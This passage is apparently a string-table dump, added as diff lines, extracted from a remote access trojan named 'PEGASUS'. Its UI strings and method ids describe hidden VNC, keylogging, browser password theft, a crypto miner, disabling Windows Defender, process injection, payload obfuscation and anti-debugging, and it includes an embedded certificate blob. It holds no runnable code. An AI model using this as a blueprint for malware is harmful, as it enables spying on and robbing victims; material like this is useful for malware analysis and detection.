+https://www.pantheon.one/video-gallery/|060008E7,060008E9|
+https://www.youtube.com/channel/UCd6mDeM9gLKOMlbUGynEUbQ|06000A26,06000A36|
+hu.png|060009AC|
+HVNC|06000B36|
+Hvnc Panel|060009AC|
+HVNC ready to connect,open HVNC tab|06000B63|
+hVNC Started!|06000B0C,06000B22|
+hVNC Stopped!|06000B0D,06000B22|
+hVNChBrowsersToolStripMenuItem|060009AC|
+hVNChBrowsersToolStripMenuItem.Image|060009AC|
+HVNCList|060009AC|
+HVNCListenPort|060009AC|
+hVNCStart|0600096B,0600096F,0600098B|
+hVNCStop|06000970|
+hwid|06000310,06000311,06000312,06000313,06000361,06000362,06000364,0600036C|
+Hwid|06000B64,06000B67,06000B68,06000B75,06000B7E,06000B82,06000B84,06000B85,06000B90,06000B91,06000B95,06000BB4,06000BB5,06000BB7,06000BB8|
+HWID|06000B77|
+Hwid:|06000730|
+HWID:|06000731|
+hwid_updated|06000310,06000312|
+icon|06000103|
+Icon Options|06000683|
+icon.Image|06000103|
+iconextractor|06000BC3|
+Icons Files(*.exe;*.ico;)|*.exe;*.ico|06000666|
+ID|060006F2,06000784,060007DD,06000B80,06000BB1|
+id.png|060009AC|
+ID:|06000731|
+Identifier|060009AC|
+IDPARAMETERS|060000D5,060000D6,060000D8,060000D9,060000DA|
+ie.png|060009AC|
+IExplorer|06000123|
+If payload is killed with task manager ,run it again!|06000683|
+Ifcod~$oro|06000643,0600064A,0600066F|
+Ignore|0600009F,060000A5,06000A19,06000A1F|
+il.png|060009AC|
+Image|06000944,06000BB6,06000BB7|
+image/jpeg|0600015B,0600015F|
+imageList1.ImageStream|06000103,0600079C,060009AC|
+imageList2.ImageStream|060009AC|
+imageRegistryDirectoryList.ImageStream|0600087D|
+imageRegistryKeyTypeList.ImageStream|0600087D|
+in.png|060009AC|
+INFO|06000A39|
+information|06000953|
+InforMation|06000B80|
+INFORMATION|06000899|
+init|0600035E|
+init_iv|0600035E,06000361,06000362,06000363,06000364,06000365,06000366,06000367,06000368,06000369,0600036A,0600036B,0600036C,0600036D,0600036E,0600036F|
+InitializeComponent|06000A4C|
+Inject|060005B0,060008DC,060008E4,060008E5,06000940|
+Injecting AntiDe4Dot...|06000A8C|
+Injecting ControlFlow...|06000A8C|
+Injecting local to fields...|06000A8C|
+Injection|06000143|
+Injection Panel|060009AC|
+injectionPanelToolStripMenuItem|060009AC|
+injectToolStripMenuItem|060005B0|
+injectToolStripMenuItem1|060005B0|
+Input|0600008F,0600076B|
+Input can not be empty.|06000B4D,06000B50|
+input can not be null.|06000B54,06000B56|
+Input HWID or IP|0600074D|
+Input seconds to record.|06000740|
+Input the WebHook and secret|0600071A|
+Input:|060005BA,060005DE|
+Input2|0600076B|
+InputDialog|0600008F|
+Install|0600079C|
+Install Date|060009AC|
+Install Patch:|0600059F,0600061E|
+Install_ed|06000B77|
+Installation|06000683|
+Installation OFF|06000642,06000683|
+Installation ON|06000642|
+InstallSchtask:|060008E2|
+installToolStripMenuItem|0600079C|
+installZip|06000796|
+InternalName|06000663|
+Interval (ms): |06000AFB|
+Interval (ms): 500|06000B36|
+IntervalLabel|06000B36|
+IntervalScroll|06000B36|
+Invalid application information!|0600030C|
+Invalid label. 
+A node with that label already exists.|0600085C,06000869|
+Invalid label. 
+The label cannot be blank.|0600085C,06000869|
+Invalid message authentication code (MAC).|06000B56|
+Invalid registrar information!|06000311,06000313,06000314|
+Invalid rootkey, could not be found.|060004BE|
+invalid_details|06000310,06000312,06000314|
+invalid_hwid|06000310,06000312|
+invalid_license|06000313|
+invalid_token|06000314|
+invalid_username|06000313|
+invalidver|0600035E|
+IO|0600078C,06000793|
+io.png|060009AC|
+IP|06000180,06000181,06000683|
+IP                                                                                          |06000683|
+IP / DNS|060009AC|
+IP/PORT saved.|0600067A|
+IP:|06000731|
+ip2region|0600016F|
+iq.png|060009AC|
+ir.png|060009AC|
+is offline|06000772|
+is online|0600076E,06000770,06000771,06000772|
+is.png|060009AC|
+isON|060007B9,06000B95|
+it.png|060009AC|
+jm.png|060009AC|
+jo.png|060009AC|
+jp.png|060009AC|
+k7Rf9MY5MS|06000633|
+Katana|060009AC|
+KATANA|060006AC,06000BB5|
+kATANAToolStripMenuItem|060009AC|
+KB|060003E4,06000470,060005AC,06000609|
+ke.png|060009AC|
+keccak|060005BA|
+key|06000361,06000363,06000364,06000631,06000801,06000802|
+Key|060001CE,060001CF,0600087D|
+Key can not be empty.|06000B4D,06000B4E,06000B50|
+Key:|06000730|
+Key||06000636|
+KeyAuth_Invalid|0600035E|
+Keyboard On/Off|0600080A|
+keyboardClick|06000801,06000802|
+keyIsDown|06000801,06000802|
+keyLogger|06000B95|
+Keylogger|060007B8,06000945,060009AC|
+keyLogger:|06000945,06000B95|
+KEYLOGS|060007B8|
+KeyName|0600086C,06000B85|
+keyPath|06000B85|
+KeyPath|06000869,0600086E,0600086F,06000870,06000871,06000872,06000873,06000874|
+keyToolStripMenuItem|0600087D|
+keyToolStripMenuItem1|0600087D|
+keyToolStripMenuItem2|0600087D|
+kg.png|060009AC|
+kh.png|060009AC|
+ki.png|060009AC|
+Kill|060006F2,060007DD|
+Kill All Browsers!|060009AC|
+Kill Connection|06000608|
+Kill task manager on execution!|06000683|
+kill taskmgr|06000683|
+Kill Windows Defender|06000683|
+Kill Windows defender on execution!|06000683|
+killConnectionToolStripMenuItem|06000608|
+killWindowsDefenderToolStripMenuItem|060009AC|
+Kindstring|0600086E,0600086F,06000870,06000871,06000872,06000873,06000B85|
+kkuoAJzUj|0600098A|
+km.png|060009AC|
+kn.png|060009AC|
+kp.png|060009AC|
+kr.png|060009AC|
+KRN_MUTEX_|060003ED|
+kw.png|060009AC|
+ky.png|060009AC|
+kz.png|060009AC|
+la.png|060009AC|
+label1|060000E2,06000123,06000143,0600059F,060005B0,060005C9,060005DE,060005E7,06000608,06000612,0600061E,06000631,0600063F,060006A5,060006AC,060006D5,060006DF,060006F2,06000707,06000710,06000718,06000721,06000730,06000742,0600074D,06000756,0600076D,06000779,0600079C,060007A7,060007B8,060007CA,060007DD,0600080A,06000815,06000825,0600083B,0600087D,06000899,060008BF,060009AC,06000A39,06000B36|
+label10|06000683,06000730,060009AC|
+label11|06000683,06000730,060009AC|
+label12|06000683,06000730,060009AC|
+label13|06000683,06000730,060009AC|
+label14|06000683,06000730,060009AC|
+label15|060005BA,060005D2,060005DE,060005E7,06000683,06000730,060008A1,060008AD,060008BF,060009AC|
+label16|06000683|
+label17|06000683|
+label18|060000E2,060000E6,060000F5,06000683|
+label19|06000683|
+label2|06000143,0600059F,060005BA,060005DE,060005E7,060005F1,06000612,0600061E,06000631,0600063F,06000683,060006DF,06000707,06000710,06000718,06000721,06000730,06000742,06000756,0600076D,06000779,060007A7,060007CA,0600080A,0600083B,0600087D,060009AC,06000A39,06000B36|
+label20|06000683|
+label21|06000683|
+label3|0600008F,060000E2,06000143,060005D2,060005E7,060005F1,06000608,06000612,0600061E,06000631,06000683,060006DF,06000707,06000710,06000718,06000721,06000730,0600076D,06000779,060007A7,060007CA,06000815,060009AC,06000A39|
+label4|06000143,0600059F,060005E7,060005F1,06000612,0600061E,06000683,06000730,06000779,060007A7,060007CA,060009AC,06000A39|
+label5|0600059F,060005E7,0600061E,06000683,060006D5,06000730,06000779,060007CA,060009AC,06000A39|
+label6|0600059F,060005E7,0600061E,06000683,060006D5,06000730,060007CA,060009AC|
+label7|0600059F,060005E7,0600061E,06000683,06000730,060009AC|
+label8|0600059F,060005E7,0600061E,06000683,06000730,060009AC|
+label9|060005F1,06000683,06000730,060009AC|
+labelfile|06000815|
+labelsize|06000815|
+labelWait|0600080A,0600083B|
+Last Login:|06000730,06000731|
+lb.png|060009AC|
+lblLoadBalance|06000608|
+lblLocalServerPort|06000608|
+lblProxyInfo|06000608|
+lc.png|060009AC|
+LegalCopyright|06000663|
+LegalTrademarks|06000663|
+li.png|060009AC|
+LicBtn|06000631|
+license|06000311,06000313,06000314,06000364|
+License|06000631,060008AD|
+License does not exist!|06000313|
+License Information|06000730|
+License Status/Update|060009AC|
+linkLabel1|06000631,060008BF|
+List|060006F3,060007DE,06000831,06000BB7|
+listBlocked|0600074D|
+listBox1|060007CA|
+listBoxIP|06000683|
+listBoxPort|06000683|
+Listen Error|060005FB|
+Listen ports|060007CA|
+Listener|060009AC|
+LISTENER|060007CA|
+Listener :|060007CA,060009AC|
+Listener Port :|060009AC|
+Listener Status:|060009AC|
+Listening|06000921,0600092A|
+Listening on port:|060008C9,06000907|
+Listening on port:4449|060008C9|
+Listenning to: {0}|0600023C|
+listView1|060005B0,060006F2,0600079C,060007DD,060009AC|
+listView1.BackgroundImage|060009AC|
+listView2|060009AC|
+listView3|060009AC|
+listView4|060009AC|
+LISTVIEWPANEL0|060009AC|
+LISTVIEWSPANEL1|060009AC|
+LISTVIEWSPANELSMALL2|060009AC|
+ListViewSubItem|06000927,06000928,0600092F|
+LISTVIEWTASKS|060009AC|
+lk.png|060009AC|
+Load settings:|0600061E|
+load_balancer_96px.png|06000103|
+loader.cs|06000639|
+Loading Pegasus Plugins:|0600012D|
+LoadKey|06000B85|
+LoadRegistryKey|0600085D|
+LOCAL|06000596,06000618,06000619|
+Local Disk|060003EC|
+Local Server Port:|06000608|
+LocalAddress|060006F2|
+Lock Screen|060006D5|
+log|0600030E,0600036F|
+Log|06000B95|
+Logger|060007B9|
+login|06000310,06000312,06000362,06000B64|
+Login|06000631,060008BF,0600098D|
+LOGIN|060008BF|
+Login successful!|06000634,06000636,060008B1|
+Login with current valid  key!|06000631|
+Login with License|06000631|
+Login with username and password!|06000631|
+LoginBtn|06000631|
+Logins|06000B84|
+logoff|0600094F|
+Logout|060009AC|
+LogPixels|0600012F|
+Logs|060009AC|
+Looks like this application is disabled, please try again later!|0600030C|
+lr.png|060009AC|
+ls.png|060009AC|
+lst_ContextMenuStrip|0600087D|
+lstConnections|06000608|
+lstRegistryValues|0600087D|
+lt.png|060009AC|
+lu.png|060009AC|
+lv.png|060009AC|
+ly.png|060009AC|
+ma.png|060009AC|
+Main|06000A65|
+Managed DLLs|060005B0|
+managedContextMenuStrip|060005B0|
+managedListView|060005B0|
+Mass Remote View|060009AC|
+masterKey can not be null or empty.|06000B52|
+Match|06000B85|
+Matches|06000B85|
+Max size:|060007A7|
+MB|060003E4,06000470,060005AC,06000609,060007A7|
+mc.png|060009AC|
+md.png|060009AC|
+me.png|060009AC|
+ME: 
+|0600076B|
+Memory|060009AC|
+menuStrip|0600087D|
+Merge .reg|060009AC|
+mergeRegToolStripMenuItem|060009AC|
+message|06000103,060001B4,060001B5,0600036B,0600036F,060008FA,060008FC|
+Message|06000934,06000941,06000B82,06000BAE,06000BAF,06000BB8|
+Message:|060005D2,06000612|
+MessageBox|060009AC|
+metroSetButton1|0600059F,0600061E|
+metroSetButton2|0600059F,0600061E|
+metroSetButton3|0600059F,0600061E|
+metroSetComboBox1|0600059F,0600061E|
+metroSetRadioButton1|0600061E|
+metroSetRadioButton2|0600061E|
+metroSetTextBox1|0600059F,0600061E|
+metroSetTextBox2|0600059F,0600061E|
+metroSetTextBox3|0600059F,0600061E|
+metroSetTextBox4|0600059F,0600061E|
+mg.png|060009AC|
+mh.png|060009AC|
+Microsoft Sans Serif|060000E2,060000E6,060000F5,0600059F,060005D2,060005E7,060005F1,06000608,06000612,0600061E,0600063F,06000683,060009AC|
+Microsoft.VisualBasic.dll|06000654|
+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|060007BC|
+min.|06000779|
+MinBtn|06000B36|
+MinBtn.Image|06000B36|
+MINER|060005BA|
+Miner archive not found |06000597,06000615|
+Miner name in archive |0600059F,0600061E|
+Miner Options|060005BA|
+MinerstartToolStripMenuItem1|060009AC|
+MinerstopToolStripMenuItem1|060009AC|
+miniToolStrip|060009AC|
+miniToolStrip.BackgroundImage|060009AC|
+minValue|06000AA3|
+Missing log information!|0600030E|
+Missing user login information!|06000310,06000312|
+mk.png|060009AC|
+ml.png|060009AC|
+mm.png|060009AC|
+MM-dd-yyyy HH;mm;ss|060007B2,060007F9,06000835,06000B67,06000B84,06000BB5,06000BB7|
+mn.png|060009AC|
+mo.png|060009AC|
+Modify Binary Data...|0600087D|
+Modify...|0600087D|
+modifyBinaryDataToolStripMenuItem|0600087D|
+modifyBinaryDataToolStripMenuItem1|0600087D|
+modifyToolStripMenuItem|0600087D|
+modifyToolStripMenuItem1|0600087D|
+monitorOff|060006C9|
+Mono.Runtime|0600007B|
+Mouse|060006D5|
+Mouse On/Off|0600080A|
+mouseClick|060007FB,060007FC|
+mouseMove|060007FD|
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36|06000091|
+mp.png|060009AC|
+mq.png|060009AC|
+mr.png|060009AC|
+ms.png|060009AC|
+MSBuild.exe|06000143|
+Msgpack|06000740,060008D5,060008DB,060008DC,060008DD,060008E0,060008E1,060008E2,060008E3,060008E4,060008E5,060008EA,060008EB,060008EC,060008ED,060008EE,060008EF,060008F2,060008F3,060008F4,060008F6,060008F7,060008FA,060008FB,060008FC,060008FD,06000901,06000902,06000904,0600090B,0600090C,0600090D,0600090E,06000910,06000911,06000912,06000913,06000914,06000936,06000940,06000941,06000943,06000944,06000946,06000948,06000949,0600094A,0600094B,0600094D,0600094E,0600094F,06000952,06000953,06000954,06000957,06000959,0600095A,0600095B,0600095F,06000962,06000964,06000967,0600096A,0600096B,0600096F,06000970,0600098B,0600098D,0600098E,0600098F,06000990,06000991,06000992,06000993,06000996,06000997,06000998,0600099A,0600099B,0600099D,0600099E,0600099F,060009A0,060009A5|
+mt.png|060009AC|
+mu.png|060009AC|
+Multi-String Value|0600087D|
+multiStringValueToolStripMenuItem|0600087D|
+multiStringValueToolStripMenuItem1|0600087D|
+multiStringValueToolStripMenuItem2|0600087D|
+MultiValueEditBinary|06000707|
+Must have access to Write in the Stream|06000158|
+Mutex|06000196,06000197|
+MUTEX|0600098B|
+Mutex:|06000683|
+mv.png|060009AC|
+mw.png|060009AC|
+mx.png|060009AC|
+my.png|060009AC|
+MyD4rkRootK|06000653|
+mz.png|060009AC|
+N/A|060002D0|
+NA|060000D6|
+na.png|060009AC|
+name|0600035E,06000361,06000362,06000363,06000364,06000365,06000366,06000367,06000368,06000369,0600036A,0600036B,0600036C,0600036D,0600036E,0600036F|
+Name|0600078B,0600078E,060007DD,0600087D|
+Native DLLs|060005B0|
+Native PE|060005B0|
+nc.png|060009AC|
+ne.png|060009AC|
+Neon Opera!|06000B36|
+Netstat|060006F2,060006F3|
+Netstat:|06000963,06000B82|
+NETWORK CONNECTION ?OR DEBUGGER FOUND,REMOVE ALL DEBUGGER TOOLS LIKE DNSPY/ILSPY|06000091|
+Network Drive|060003EC|
+New|0600087D|
+New client connected!|060009AC|
+New Folder|0600079C|
+New item selection|060009AC|
+New machine has been binded, re-open the application!|06000310,06000312|
+newKeyName|06000B85|
+NewKeyName|0600085C|
+newName|06000B85|
+NewName|0600078E|
+newtonsoft.json|06000BC3|
+newToolStripMenuItem|0600087D|
+newToolStripMenuItem1|0600087D|
+newToolStripMenuItem2|0600087D|
+NewValueName|06000869,06000B85|
+nf.png|060009AC|
+ng.png|060009AC|
+ngrok|06000B64|
+Ngrok Panel|060005F1,060009AC|
+NGROK PANEL|060005F1|
+NgrokPort|060001D6,060001D7|
+NgrokProto|060001D4,060001D5|
+NgrokStart|06000992,06000998,060009A5|
+NgrokStop|060008D5|
+NgrokToken|060001D8,060001D9|
+ngrokToolStripMenuItem|060009AC|
+ni.png|060009AC|
+nl.png|060009AC|
+No|060000A3,060000A5,06000A1D,06000A1F|
+No network adapters with an IPv4 address in the system!|06000674|
+No session has been started, closing for security reasons!|0600031A|
+No threat found. Going up 50% of current size.|0600067C|
+no.png|060009AC|
+None|06000BB7|
+normalinstall|06000967|
+normaluninstall|060008F7|
+Not initialized Check if KeyAuthApp.init() does exist|06000360|
+Not Listening|06000921,060009AC|
+Not Listening |06000907,06000983|
+notepad|06000091|
+NoThreatFound|0600067C|
+Notification|0600017C,0600017D|
+Notifications :|060007CA|
+Notifications:|060009AC|
+notifyIcon1.Icon|060009AC|
+notInstallCPUgpu6|0600020C,0600020D|
+np.png|060009AC|
+nr.png|060009AC|
+nu.png|060009AC|
+nudServerPort|06000608|
+null|06000668|
+number|060008BF|
+Number of emails to send|060005E7|
+numDelay|06000683|
+numericUpDown1|060006D5,060007A7,0600080A,0600083B|
+numericUpDown2|060006D5,0600080A|
+numPort|060007CA|
+nz.png|060009AC|
+o|0600064A|
+O|0600064A|
+O Neon|06000123|
+Obfuscate Payload!|06000683|
+Obfuscate Payload!Don't check this if you use a crypter!|06000683|
+-Obfuscated.exe|06000A8C|
+Off|060008D1|
+offToolStripMenuItem|060009AC|
+offToolStripMenuItem.Image|060009AC|
+ok|06000A39|
+Ok|06000143,0600059F,060005BA,060005DE,0600061E,060006DF,06000707,06000710,06000718,06000721,06000756,060007A7,060007CA|
+OK|06000087,060000A0,060000A1,060000A2,060000A5,06000A1A,06000A1B,06000A1C,06000A1F|
+okbutton|06000710|
+okButton|060006DF|
+OldKeyName|0600085C|
+oldName|06000B85|
+OldValueName|06000869,06000B85|
+om.png|060009AC|
+On|060008D1,060009AC|
+Online|06000170|
+Online {0}     Selected {1}            Upload {2}     Download  {3}                    CPU Usage: {4}%     Memory Usage: {5}%|06000935|
+Online1|06000171|
+onToolStripMenuItem|060009AC|
+onToolStripMenuItem.Image|060009AC|
+Open|060006D5|
+Open and Delete may not work properly!|06000845|
+Open Client folder|0600079C|
+Open Connections|06000608|
+Open Link Hidden!|060009AC|
+Open Support Ticket|060009AC|
+openCD-|060006C4|
+openCD+|060006C3|
+openClientFolderToolStripMenuItem|0600079C|
+opened_folder_48px.png|0600079C|
+openSupportTicketToolStripMenuItem|060009AC|
+Opera|06000123|
+Opera Neon Browser started successfully!|0600092E|
+Opera Neon Browser successfully started with clone profile !|0600092E|
+Opera!|06000B36|
+Operation Completed To Selected Clients: |06000924,06000925,06000926,06000927,06000929|
+Operationg System|060009AC|
+Option|060006F3,0600076F,06000770,060007DE,060007F7,060007FB,060007FC,060007FD,06000801,06000802,06000946,06000947,0600094D,0600094E,0600094F|
+Orbitum Browser started successfully!|0600092E|
+Orbitum Browser successfully started with clone profile !|0600092E|
+Orbitum Browser!|06000B36|
+Original Filename:|06000683|
+OriginalFilename|06000663|
+OS|06000B77|
+Outlook!|06000B36|
+Overflow|06000715|
+ow7dxys8glfor9tnc2ansdfo1etkfjcv|06000731|
+ownerid|0600035E,06000361,06000362,06000363,06000364,06000365,06000366,06000367,06000368,06000369,0600036A,0600036B,0600036C,0600036D,0600036E,0600036F|
+pa.png|060009AC|
+Pac_ket|06000238,060006BB,060006BC,060006BD,060006BE,060006BF,060006C0,060006C1,060006C2,060006C3,060006C4,060006C5,060006C6,060006C7,060006C8,060006C9,060006CA,060006CC,060006CD,060006CE,060006F3,06000740,06000764,06000765,0600076B,0600076F,06000770,06000781,06000782,06000783,06000784,06000785,06000786,06000787,06000789,0600078A,0600078B,0600078C,0600078D,0600078E,0600078F,06000790,06000793,06000794,06000795,06000796,060007B9,060007DE,060007F7,060007FB,060007FC,060007FD,06000801,06000802,0600081D,0600081E,06000831,0600085C,0600085D,06000869,0600086B,0600086C,0600086E,0600086F,06000870,06000871,06000872,06000873,06000874,0600087B,060008D5,060008DB,060008DC,060008DD,060008E0,060008E1,060008E2,060008E3,060008E4,060008E5,060008E6,060008EA,060008EB,060008EC,060008ED,060008EE,060008EF,060008F2,060008F3,060008F4,060008F6,060008F7,060008FA,060008FB,060008FC,06000901,06000903,06000904,0600090B,0600090C,0600090D,0600090E,06000910,06000911,06000912,06000913,06000914,06000934,06000936,06000937,0600093B,0600093C,0600093D,0600093E,06000940,06000941,06000943,06000944,06000945,06000946,06000947,06000948,06000949,0600094A,0600094B,0600094D,0600094E,0600094F,06000952,06000953,06000954,06000957,06000959,0600095A,0600095B,0600095C,0600095F,06000962,06000963,06000964,06000966,06000967,06000969,0600096A,0600096B,0600096F,06000970,0600098B,0600098D,0600098E,0600098F,06000990,06000991,06000992,06000993,06000996,06000997,06000998,0600099A,0600099B,0600099D,0600099E,0600099F,060009A0,060009A5,060009A8,060009A9,060009AA,06000B90,06000B95,06000BAE|
+Packet|060000D5,060000D8,060000D9,060005C7,060008FD,06000902,060009A1,060009A2,060009A3|
+PaleMoon|06000123|
+Palemoon Browser started successfully!|0600092E|
+Palemoon Browser successfully started with clone profile !|0600092E|
+Palemoon!|06000B36|
+panel1|060000E6,060000F5,06000123,0600012D,060005C9,06000825,0600083B|
+panel2|060009AC|
+panel3|060009AC|
+Pantheon Shop|060009AC|
+params|0600036D|
+ParentPath|0600085C,0600086B,0600086C,06000B85|
+PARMPHOENIX|060000D8,060000D9|
+PARMXMRIG|060000D5|
+pass|06000361,06000362|
+Pass|060008FD|
+password|060001A6,060001A7,06000310,06000311,06000312,06000313,06000314,0600059F,0600061E,06000631,060008BF,060008EB,0600099F|
+Password|060005BA,060005E7,06000631,060008AD,060008BF,06000B7E|
+Password Recovery|060009AC|
+Password saved error: |06000B7E|
+Password_|06000BB5|
+passwordRecoveryToolStripMenuItem|060009AC|
+passwordRecoveryToolStripMenuItem.Image|060009AC|
+Passwords|060008A1|
+Passwords Recovery!|060009AC|
+Paste|0600079C|
+Paste_bin|0600017E,0600017F|
+PasteBin|06000721|
+Pastebin Settings|06000721|
+Pastebin:|06000683|
+pasteFile|0600078D|
+pasteToolStripMenuItem|0600079C|
+Path|060005B0,06000781,06000782,06000786,06000789,0600078A,0600078F,06000794,06000795,06000B77|
+PB|06000470,060005AC,06000609|
+pcOptions|0600094D,0600094E,0600094F|
+pcuser|0600030E,0600036F|
+Pe File|0600063F|
+PE TO SHELL|0600063F|
+pe.png|060009AC|
+PEGALISIUS|060009AC|
+PEGASUS|06000091,0600012F,06000172,06000631,06000683,060009AC,06000B36|
+PEGASUS |06000668|
+PEGASUS | LOGIN|06000631|
+Pegasus Builder|060009AC|
+PEGASUS HRDP|06000B64|
+Pegasus Hvnc|06000B36|
+PEGASUS hVNC|06000924,06000925,06000926,06000927,06000928,06000929|
+PEGASUS RunPE|06000683|
+PEGASUS Server|06000756|
+Pegasus Version:|06000730|
+PEGASUS.NET|06000A6F|
+PEGASUS.Properties.Resources|06000169|
+PEGASUS_HVNC|0600098A|
+PegasusBinder.exe|060009A6|
+pEGASUSBUILDERToolStripMenuItem|060009AC|
+PEGASUSBySKYNET|06000B58|
+PEGASUSCertificate.p12|060007C0,060007C4,060008B0,060008B9,060008BA|
+PEGASUSMutex_αβγδεζηθικλμνξοπρστ|06000683|
+PEGASUSRecovery|0600092E|
+PEGASUSX|06000633|
+PeToShell|0600063F|
+PeToShell Builder|06000639|
+PeToShell Converter|060009AC|
+peToShellConverterToolStripMenuItem|060009AC|
+pf.png|060009AC|
+pg.png|060009AC|
+ph.png|060009AC|
+picIcon|06000683|
+picIcon.Image|06000683|
+picTitleIcon|06000123|
+picTitleIcon.Image|06000123|
+pictureBox1|0600008F,060000E2,060000E6,060000F5,06000123,06000143,0600059F,060005B0,060005BA,060005C9,060005D2,060005DE,060005E7,060005F1,06000608,06000612,0600061E,06000631,0600063F,06000683,060006AC,060006D5,060006DF,060006F2,06000707,06000710,06000718,06000721,06000730,06000742,06000756,0600076D,06000779,0600079C,060007A7,060007B8,060007CA,060007DD,0600080A,06000815,06000825,0600083B,0600087D,06000899,060008A1,060008AD,060008BF,06000A39,06000B36|
+pictureBox1.Image|0600008F,06000143,0600059F,060005B0,060005BA,060005C9,060005D2,060005DE,060005E7,060005F1,06000608,06000612,0600061E,06000631,0600063F,06000683,060006AC,060006D5,060006DF,060006F2,06000707,06000710,06000718,06000721,06000730,06000742,06000756,0600076D,06000779,0600079C,060007A7,060007B8,060007CA,060007DD,06000815,06000825,0600087D,06000899,060008A1,060008AD,060008BF,06000A39,06000B36|
+pictureBox2|0600076D,0600080A,0600083B,06000A39|
+pictureBox2.Image|0600076D,0600080A,0600083B,06000A39|
+pictureBox8|060005C9|
+Ping|06000934|
+Ping: 0ms|06000B36|
+Ping: Measuring....|060000F1|
+PingStatusLabel|06000B36|
+PingTransfor|060000F1|
+pinvoke.kernel32|06000BC3|
+pinvoke.windows.core|06000BC3|
+PixelFormat is not equal to previous Bitmap|06000158|
+pk.png|060009AC|
+pl.png|060009AC|
+play|060007F7,06000831|
+Play Audio|060006D5|
+play_48px.png|060009AC|
+playAudio|060006CE|
+Please choose a wav file.|060006CE|
+Please do not use this software to attack people 
+and steal they passwords and money.
+
+|06000683|
+Please enter a valid port|060005FB|
+Please enter a valid port > 0.|060005FB|
+Please initialize first|06000360|
+Please initialize your application first!|0600030E,06000310,06000311,06000312,06000313,06000314|
+Please Wait|06000781|
+Please wait...|0600083B|
